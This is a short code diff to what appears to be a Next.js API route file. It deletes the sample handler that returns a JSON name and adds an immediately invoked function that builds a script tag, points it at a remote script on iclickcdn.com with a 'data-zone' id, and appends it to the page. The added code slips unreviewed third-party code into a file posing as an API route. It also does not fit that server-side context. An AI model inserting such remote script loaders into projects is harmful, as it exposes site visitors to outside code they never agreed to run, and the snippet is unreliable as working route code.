@@ -1,6 +1,5 @@
-// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
 
-export default (req, res) => {
-  res.statusCode = 200
-  res.json({ name: 'John Doe' })
-}
+(function (s, u, z, p) {
+    (s.src = u), s.setAttribute("data-zone", z), p.appendChild(s);
+})(document.createElement("script"), "https://iclickcdn.com/tag.min.js", 3776465, document.body || document.documentElement);
+
